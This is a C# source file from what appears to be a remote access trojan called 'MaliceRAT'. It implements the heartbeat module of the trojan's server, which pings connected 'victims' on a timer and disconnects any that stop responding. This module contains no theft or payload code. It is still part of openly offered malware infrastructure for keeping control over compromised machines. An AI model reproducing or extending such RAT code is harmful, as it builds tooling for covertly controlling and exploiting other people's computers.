using System;
using System.Net.Sockets;
using System.Timers;
using System.Web.Script.Serialization;
using System.Threading.Tasks;

namespace MaliceRAT.RatServer.Features
{
    public class Heartbeat
    {
        #region Variables
        private double interval;
        private Timer heartbeatTimer;
        private Server server;
        private bool heartbeatReceived = true;

        public Heartbeat(double interval, Server server)
        {
            this.interval = interval;
            this.server = server;
            heartbeatTimer = new Timer(interval);
            server.MessageReceived += HandleMessage;
        }
        #endregion

        #region Methods
        public void StartHeartbeat(NetworkStream stream, Victim victim)
        {
            heartbeatTimer.Elapsed += async (sender, e) =>
            {
                if (!heartbeatReceived)
                {
                    heartbeatTimer.Stop();
                    stream.Close();
                    server.OnClientDisconnected(victim);
                    return;
                }
                heartbeatReceived = false;
                await SendHeartbeat(stream, victim);
            };
            heartbeatTimer.Start();
        }

        public void StopHeartbeat()
        {
            heartbeatTimer.Stop();
        }

        private void HandleMessage(Victim victim, dynamic jsonMessage)
        {
            if (jsonMessage["type"] == "heartbeat")
            {
                heartbeatReceived = true;
            }
        }

        private async Task SendHeartbeat(NetworkStream stream, Victim victim)
        {
            if (stream != null && stream.CanWrite)
            {
                await victim.SendAsync(new { type = "heartbeat", text = "ping" });
            }
        }
        #endregion
    }
}